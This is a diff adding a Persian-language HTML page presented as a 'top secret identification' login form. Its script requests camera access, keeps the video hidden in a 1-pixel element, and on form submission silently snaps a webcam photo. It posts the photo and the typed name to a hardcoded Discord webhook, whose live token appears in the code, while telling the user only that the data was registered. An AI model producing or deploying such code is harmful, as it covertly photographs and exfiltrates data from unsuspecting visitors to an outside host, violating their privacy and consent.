@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>شناسایی فوق سری</title>
+  <style>
+    body {
+      background: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Vazir', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    h2 {
+      color: #58a6ff;
+      margin-bottom: 20px;
+      font-size: 28px;
+    }
+
+    input {
+      background-color: #161b22;
+      color: #c9d1d9;
+      border: 2px solid #30363d;
+      padding: 12px;
+      border-radius: 8px;
+      width: 280px;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+
+    button {
+      background-color: #238636;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .container {
+      background-color: #161b22;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px #58a6ff44;
+      text-align: center;
+    }
+
+    video, canvas {
+      display: none;
+      width: 1px;
+      height: 1px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>ورود به سیستم شناسایی</h2>
+    <form id="secretForm">
+      <input type="text" id="name" placeholder="اسمتو وارد کن..." required>
+      <br>
+      <button type="submit">تأیید اطلاعات</button>
+    </form>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
+
+    // درخواست دسترسی به دوربین
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        console.error("خطا در دسترسی به دوربین:", err);
+      });
+
+    document.getElementById("secretForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+
+      // ارسال متن به دیسکورد
+      fetch("https://discord.com/api/webhooks/1374503391539101829/galFqUjm2Z1_1ANLko4FMo5Vl8MnPOfQK5Sts1NYd3T1bPDDGWhVaohG43g_pMdb7B7P", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `یه نفر گفت: ${name}` })
+      });
+
+      // گرفتن عکس از ویدیو
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("file", blob, "photo.jpg");
+        formData.append("payload_json", JSON.stringify({
+          content: `تصویر همزمان با پیام ${name}`
+        }));
+
+        fetch("https://discord.com/api/webhooks/1374503391539101829/galFqUjm2Z1_1ANLko4FMo5Vl8MnPOfQK5Sts1NYd3T1bPDDGWhVaohG43g_pMdb7B7P", {
+          method: "POST",
+          body: formData
+        });
+      });
+
+      alert("اطلاعات ثبت شد!");
+      document.getElementById("name").value = "";
+    });
+  </script>
+</body>
+</html>
